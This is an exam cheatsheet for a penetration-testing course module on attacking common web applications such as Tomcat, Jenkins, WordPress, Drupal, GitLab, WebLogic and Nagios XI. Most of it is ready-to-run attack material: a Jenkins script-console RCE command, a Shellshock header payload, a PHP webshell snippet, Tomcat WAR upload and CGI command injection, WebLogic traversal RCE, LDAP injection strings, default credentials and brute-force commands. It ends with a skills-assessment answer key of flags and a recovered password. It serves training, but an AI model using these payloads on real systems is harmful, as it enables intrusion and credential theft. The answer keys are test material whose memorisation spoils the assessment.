# 00 — Attacking Common Applications · EXAM CHEATSHEET

> Fast reference for the whole module (§01–33). Through-line everywhere:
> **discover → fingerprint EXACT version → default creds / known CVE / built-in functionality → reuse creds for lateral movement.**
> Set once: `export T=<target_ip>  LH=$(ip -br a show tun0|awk '{print $3}'|cut -d/ -f1)`

---

## 0 · Methodology + Discovery

```bash
nmap -p- -sT -sV -T4 --min-rate 2000 -Pn --open $T -oN nmap.txt   # ALL ports (apps hide on odd ports)
eyewitness --web -x nmap.xml -d ew/                                 # visual triage of every web port
whatweb http://$T/ ; curl -sI http://$T/                            # fingerprint + default-cred hints
```
- **Add every vhost to `/etc/hosts` immediately** (hostname tools die without it): `echo "$T a.local b.local" | sudo tee -a /etc/hosts`
- **vhost fuzz** (filter the wildcard first): `curl -s -o/dev/null -w '%{size_download}' -H 'Host: zzz.X' http://$T/` → `ffuf -u http://$T/ -H 'Host: FUZZ.X' -w DNS-5000.txt -fs <baseline>`
- Port tells: `8080`Tomcat/PRTG · `8000`Jenkins/Splunk · `8500`ColdFusion · `8009`AJP(Ghostcat) · `7001`WebLogic · `5667`NSCA(Nagios) · `389/636`LDAP · `8089`Splunk-mgmt

---

## 1 · Per-Application Quick Reference

### WordPress (§3-4)
```bash
curl -s http://$T | grep -iE 'wp-content|generator'; curl -s http://$T/readme.html|grep -i version
curl -s "http://$T/?author=1"                       # user enum (redirect→slug)
wpscan --url http://$T -e ap,u --plugins-detection aggressive
wpscan --url http://$T -U admin -P rockyou.txt --password-attack xmlrpc
```
- Plugins = 54% of WP CVEs. mail-masta LFI `?pl=/etc/passwd` (CVE-2016-1000127); wpDiscuz 7.0.4 RCE (CVE-2020-24186).
- Authed admin → Appearance→Theme Editor `404.php`=webshell, or `msf wp_admin_shell_upload`.

### Joomla (§5-6)
```bash
curl -s http://$T/administrator/manifests/files/joomla.xml|grep version
droopescan scan joomla -u http://$T/
```
- Default `admin:admin`. CVE-2019-10945 dir-traversal (≤3.9.4). Read `configuration.php` → `$password` (DB creds → reuse).

### Drupal (§7-8)
```bash
curl -s http://$T/CHANGELOG.txt|grep -m2 ''; droopescan scan drupal -u http://$T/
```
- Drupalgeddon CVE-2014-3704 (7.0-7.31 SQLi→admin) · Drupalgeddon2 CVE-2018-7600 (<7.58/<8.5.1 direct RCE) · Drupalgeddon3 CVE-2018-7602. `msf drupal_drupageddon3`. PHP-filter module → `<?php system($_GET[x]);?>` node.

### Tomcat (§9-10, 19)
```bash
curl -s http://$T:8080/docs/|grep Tomcat                                  # version
hydra ... or python loop vs /manager/html with tomcat-betterdefaultpasslist.txt
curl --user tomcat:PASS -T shell.war "http://$T:8080/manager/text/deploy?path=/x&update=true"
```
- `tomcat-users.xml` creds. **Ghostcat CVE-2020-1938** (AJP 8009, unauth file-read `WEB-INF/web.xml`; RCE only if you can upload a JSP-content file).
- **CVE-2019-0232** (Windows CGI, §19/§31): `/cgi/x.bat?&<cmd>` — args sep=`+` (NOT %20), encode `\`=`%5C` `:`=`%3A`, PATH unset (full paths), short stdout eaten by CGI parser → redirect to webroot: `?&type+c%3A%5C..%5Cflag.txt+%3E+..%5C..%5Cp.txt` then GET `/p.txt`.

### Jenkins (§11-12)
```bash
curl -sI http://$T:8000/|grep -i x-jenkins                                # version
CRUMB=$(curl -s -c/tmp/j -u admin:admin "http://$T:8000/crumbIssuer/api/json"|grep -oP 'Jenkins-Crumb:\K[a-f0-9]+')
curl -s -b/tmp/j -u admin:admin --data-urlencode 'script=def p=["id"].execute();println p.text' "http://$T:8000/scriptText"
```
- Default `admin:admin|admin:password`. Script Console = instant RCE (Groovy). Pre-auth RCE ≤2.137 (CVE-2018-1999002 + CVE-2019-1003000).

### Splunk (§13-14)  — **HTTPS, use `curl -sk`**
```bash
curl -sk "https://$T:8089/services/server/info"|grep -oP 'version="\K[^"]+'
```
- Enterprise default `admin:changeme`; Free edition = NO auth. RCE = upload malicious Splunk **app bundle** (reverse-shell script) via `/en-US/manager/appinstall/_upload`.

### PRTG (§15)
```bash
curl -s "http://$T:8080/api/getpasshash.htm?username=prtgadmin&password=prtgadmin"
```
- Default `prtgadmin:prtgadmin` / `prtgadmin:Password123`. **CVE-2018-9276** authed cmd-injection via Notification "EXE" param → creates local admin → `nxc smb $T -u prtgadm1 -p 'Pwn3d_by_PRTG!'`.

### osTicket (§16)
- `/scp/login.php` (staff). **Closed tickets contain plaintext creds** (agents paste passwords). Users/Address-book = password-spray list. CVE-2020-24881 SSRF (1.14.1).

### GitLab (§17-18, 32)
```bash
curl -s http://$T/api/v4/version ; curl -s "http://$T/api/v4/projects?visibility=public"
# self-register: GET /users/sign_up -> authenticity_token -> POST /users -> MANDATORY welcome PATCH
```
- Self-registration bypasses "authenticated" CVEs. **"internal" visibility ≠ private** — any account sees it. CVE-2021-22205 ExifTool RCE (CE ≤13.10.2, `searchsploit -m 49821`). Loot `/etc/gitlab/gitlab.rb`.

### Shellshock (§20)
```bash
curl -s -H 'User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd' http://$T/cgi-bin/SCRIPT.cgi
```
- CVE-2014-6271. Find cgi: `gobuster dir -u http://$T/cgi-bin/ -x cgi,sh,pl`. Payload in **User-Agent** (also Referer/Cookie).

### ColdFusion (§23-24)  — port **8500** (`Server: JRun`)
```bash
curl -sI http://$T:8500/CFIDE/administrator/index.cfm    # copyright yr: 1995-2006=CF8
```
- 5500=Server-Monitor. **CVE-2010-2861** dir-traversal (`locale=../../`) read `lib\password.properties` (SHA1 → `hashcat -m 100`). **CVE-2009-2265** FCKeditor `%00` JSP upload RCE (`/CFIDE/scripts/ajax/FCKeditor/.../upload.cfm?...CurrentFolder=/x.jsp%00`).

### IIS Tilde 8.3 (§25)  — IIS ≤7.5
- `404`=short-name exists, `400`=not. Tools: `iis_shortname_scanner.jar`, msf `auxiliary/scanner/http/iis_shortname_scanner`, `shortscan`. Then `egrep -rh '^prefix' wordlists|sort -u` → `gobuster -x .aspx,.asp`.

### LDAP (§26)
```bash
ldapsearch -H ldap://$T -x -s base namingcontexts          # anon → base DN
```
- Web login over LDAP → auth bypass: **`*` in BOTH username & password**. Fallbacks: `*)(uid=*))(|(uid=*`, `admin)(&)`.

### Web Mass Assignment (§27)
- Add a hidden privileged param at registration: `&admin=true|&active=1|&confirmed=1|&role=admin`. Read source/JS for the real (often renamed) field; `try: if request.form['x']` ⇒ field only needs to **exist**.

### Apps→Services / binaries (§28, 33)
```bash
gdb ./bin -ex 'b SQLDriverConnect' -ex run -ex 'printf "%s\n",(char*)$rdx' -ex q -batch -nx   # ELF conn-string
strings -e l app.dll | grep -iE 'server=|password|uid='        # .NET literals = UTF-16LE!
```
- .NET DLL: `dnSpy` (logic/obfuscation) / `monodis --userstrings` / `ilspycmd`. **Always reuse-test recovered DB creds** (`mssqlclient.py`, `nxc mssql/smb`, spray).

### WebLogic & honorable mentions (§29)
```bash
curl -s http://$T:7001/console/login/LoginForm.jsp|grep footerVersion       # 12.2.1.3 → vuln
```
- **CVE-2020-14882+14883** unauth RCE: `/console/css/%252e%252e%252fconsole.portal?...handle=com.tangosol.coherence.mvel2.sh.ShellSession('<MVEL reads cmd hdr>')` (catch `IncompleteRead` → use partial/curl).
- Defaults: Nagios `nagiosadmin:PASSW0RD` · WebSphere `system:manager` · Tomcat/PRTG/Splunk above. vCenter CVE-2021-22005.

### Nagios XI (§32)
- v5.7.5 < 5.8.0 → **CVE-2020-35578** `searchsploit -m 49422` (auth RCE, plugins filename inj). msf alt: `nagios_xi_plugins_filename_authenticated_rce` / `..._configwizards_...`. Privesc (`sudo -l` www-data): swap `/usr/local/nagios/bin/npcd` + `sudo manage_services.sh restart npcd`, or `autodiscover_new.php` arg-injection.

---

## 2 · Tools

| Job | Tool |
|-----|------|
| Visual recon | `eyewitness`, `whatweb`, `aquatone` |
| vhost/dir fuzz | `ffuf`, `gobuster`, `feroxbuster` |
| CMS scan | `wpscan` (WP), `droopescan` (Joomla/Drupal), `joomscan` |
| Brute | `hydra`, `nxc`, wpscan `--password-attack` |
| Exploit search | `searchsploit -m <id>` (msf broken here — see gotchas) |
| .NET RE | `dnSpy`, `ilspycmd`, `monodis`, `de4dot`, `strings -e l` |
| Native RE | `gdb`/PEDA, `x64dbg`, Ghidra, `ProcMon`, `API Monitor` |
| Tilde | `iis_shortname_scanner.jar`, `shortscan` |
| Creds reuse | `mssqlclient.py`, `nxc {smb,mssql,winrm}`, `evil-winrm` |
| Headless win | `nxc winrm -X` (exec), `smbclient //$T/C$` (file pull) |

---

## 3 · GOTCHAS (hard-won this module — read before the exam)

- **`msfconsole` is broken on this Kali** → every HTTP module: `uninitialized constant HTTP`. Use standalone PoCs / `searchsploit`. (Affects `-x` and interactive.)
- **.NET strings = UTF-16LE** → `strings -e l` (plain `strings` shows nothing). `monodis --userstrings` is surgical.
- **CVE-2019-0232 Tomcat CGI**: arg sep `+` not `%20`; encode `\`→`%5C` `:`→`%3A`; PATH unset (full paths); CGI parser eats short stdout → **redirect to webroot & GET**.
- **WebLogic MVEL gadget** interrupts the thread → Python `IncompleteRead`; catch `e.partial` or use `curl`.
- **vhost fuzzing** returns everything unless you `-fs` the default-site size first.
- **GitLab self-reg** needs the `authenticity_token` AND the post-signup **welcome PATCH** (`/users/sign_up/welcome`) or every repo 302s back.
- **Kali pip** = PEP-668 `externally-managed` → `sudo apt install python3-<pkg>` or `pip3 install --break-system-packages`.
- **No sudo/tty in some shells** → can't edit `/etc/hosts`; monkeypatch `socket.getaddrinfo` in Python instead.
- **zsh**: unquoted vars don't word-split; don't name funcs after aliases (`g`).
- **Check for the flag in web dirs *before* privesc** (`find / -name '*flag*' 2>/dev/null`) — root often unnecessary.
- **Static vs runtime answers**: port/protocol/default-cred = recall (answer from notes); IPs/hashes/instance passwords = MUST verify on the box.
- **Don't tunnel-vision**: fingerprint *all* web ports, match exact version→CVE, then pick (multi-app boxes).

---

## 4 · Skills-Assessment chains (verified)

| | App | Path | Answer key |
|---|-----|------|-----------|
| **I** (§31) | Tomcat 9.0.0.M1 :8080 | rule out manager/PUT/Ghostcat → CVE-2019-0232 `/cgi/cmd.bat` → SYSTEM | `f55763d31a8f63ec935abd07aee5d3d0` |
| **II** (§32) | WP+GitLab+Nagios XI | vhost enum → GitLab `Virtualhost` README + open-reg → `nagios-postgresql` INSTALL (`nagiosadmin:oilaKglm7M09@CPL&^lC`) → Nagios XI 5.7.5 CVE-2020-35578 → www-data shell | `afe377683dce373ec2bf7eaf1e0107eb` |
| **III** (§33) | MultimasterAPI.dll | WinRM admin → SMB pull DLL → `strings -e l` → conn string | `D3veL0pM3nT!` |

---

> **Exam mindset:** most footholds = *default password + built-in functionality*. Enumerate wide, version precisely, look up the CVE, reuse creds everywhere. Full per-section detail in `01`–`33`.
